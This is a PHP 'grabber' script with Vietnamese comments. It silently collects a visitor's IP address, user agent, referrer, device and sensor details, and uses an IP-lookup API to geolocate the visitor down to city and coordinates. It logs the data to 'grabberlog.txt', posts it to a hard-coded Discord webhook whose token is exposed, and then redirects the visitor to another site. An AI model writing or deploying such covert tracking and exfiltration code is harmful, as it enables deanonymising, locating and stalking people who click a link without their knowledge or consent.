<?php
// Danh sách các IP bị blacklist
$blacklist_ips = ['171.245.120.25', '113.21.132.1'];

// Lấy IP của người dùng
function getUserIP() {
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Kiểm tra IP của người dùng
$user_ip = getUserIP();

// Nếu IP của người dùng nằm trong danh sách blacklist
if (in_array($user_ip, $blacklist_ips)) {
    echo "ʏᴏᴜʀ ᴀʀᴇ ɪɴ ʙʟᴀᴄᴋʟɪꜱᴛ. | ʏᴏᴜʀ ɪᴘ ɪꜱ: $user_ip";
    exit;
}

// Lấy thông tin của người dùng
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No referrer';
$time = date('Y-m-d H:i:s');

// Thông tin bổ sung từ JavaScript
$resolution = isset($_POST['resolution']) ? $_POST['resolution'] : 'Unknown';
$cpu = isset($_POST['cpu']) ? $_POST['cpu'] : 'Unknown';
$gpu = isset($_POST['gpu']) ? $_POST['gpu'] : 'Unknown';
$language = isset($_POST['language']) ? $_POST['language'] : 'Unknown';
$sensor_data = isset($_POST['sensor_data']) ? $_POST['sensor_data'] : 'Unknown';

// Sử dụng API để lấy thông tin ISP và địa lý
$api_url = "http://ip-api.com/json/$user_ip?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,mobile,proxy,hosting";
$isp_info = @file_get_contents($api_url);
if ($isp_info) {
    $isp_data = json_decode($isp_info, true);
    if ($isp_data['status'] == 'success') {
        $continent = $isp_data['continent'] ?? 'Unknown';
        $continentCode = $isp_data['continentCode'] ?? 'Unknown';
        $country = $isp_data['country'] ?? 'Unknown';
        $countryCode = $isp_data['countryCode'] ?? 'Unknown';
        $region = $isp_data['region'] ?? 'Unknown';
        $regionName = $isp_data['regionName'] ?? 'Unknown';
        $city = $isp_data['city'] ?? 'Unknown';
        $district = $isp_data['district'] ?? 'Unknown';
        $zip = $isp_data['zip'] ?? 'Unknown';
        $lat = $isp_data['lat'] ?? 'Unknown';
        $lon = $isp_data['lon'] ?? 'Unknown';
        $timezone = $isp_data['timezone'] ?? 'Unknown';
        $offset = $isp_data['offset'] ?? 'Unknown';
        $currency = $isp_data['currency'] ?? 'Unknown';
        $isp = $isp_data['isp'] ?? 'Unknown';
        $org = $isp_data['org'] ?? 'Unknown';
        $as = $isp_data['as'] ?? 'Unknown';
        $asname = $isp_data['asname'] ?? 'Unknown';
        $mobile = $isp_data['mobile'] ? 'true' : 'false';
        $proxy = $isp_data['proxy'] ? 'true' : 'false';
        $hosting = $isp_data['hosting'] ? 'true' : 'false';
    } else {
        // Nếu có lỗi khi truy cập API
        $continent = $continentCode = $country = $countryCode = $region = $regionName = $city = $district = $zip = $lat = $lon = $timezone = $offset = $currency = $isp = $org = $as = $asname = 'Unknown';
        $mobile = $proxy = $hosting = 'false';
    }
} else {
    $continent = $continentCode = $country = $countryCode = $region = $regionName = $city = $district = $zip = $lat = $lon = $timezone = $offset = $currency = $isp = $org = $as = $asname = 'Unknown';
    $mobile = $proxy = $hosting = 'false';
}

// Lưu thông tin vào file grabberlog.txt
$log = "IP: $user_ip | Time: $time | User Agent: $user_agent | Referrer: $referrer | Resolution: $resolution | CPU: $cpu | GPU: $gpu | Language: $language | Sensor Data: $sensor_data | Continent: $continent | Continent Code: $continentCode | Country: $country | Country Code: $countryCode | Region: $region | Region Name: $regionName | City: $city | District: $district | Zip: $zip | Latitude: $lat | Longitude: $lon | Timezone: $timezone | Offset: $offset | Currency: $currency | ISP: $isp | Org: $org | AS: $as | AS Name: $asname | Mobile: $mobile | Proxy: $proxy | Hosting: $hosting\n";
file_put_contents('grabberlog.txt', $log, FILE_APPEND);

// Gửi thông tin đến Discord webhook
$webhook_url = 'https://discord.com/api/webhooks/1259503203435941949/_JVKc-QKlBHtjIKoqvwsyrFsMoZUxlVOjLkfsY9vfz83pgZztWwUEDxMXVTEA6op3bmZ';
$data = json_encode([
    'content' => "IP: $user_ip\nUser Agent: $user_agent\nReferrer: $referrer\nTime: $time\nResolution: $resolution\nCPU: $cpu\nGPU: $gpu\nLanguage: $language\nSensor Data: $sensor_data\nContinent: $continent\nContinent Code: $continentCode\nCountry: $country\nCountry Code: $countryCode\nRegion: $region\nRegion Name: $regionName\nCity: $city\nDistrict: $district\nZip: $zip\nLatitude: $lat\nLongitude: $lon\nTimezone: $timezone\nOffset: $offset\nCurrency: $currency\nISP: $isp\nOrg: $org\nAS: $as\nAS Name: $asname\nMobile: $mobile\nProxy: $proxy\nHosting: $hosting"
]);

$options = [
    'http' => [
        'header' => "Content-type: application/json\r\n",
        'method' => 'POST',
        'content' => $data,
    ],
];

$context = stream_context_create($options);
$result = file_get_contents($webhook_url, false, $context);

// Chuyển hướng đến trang web khác
header("Location: https://4h4b.love");
exit;
?>
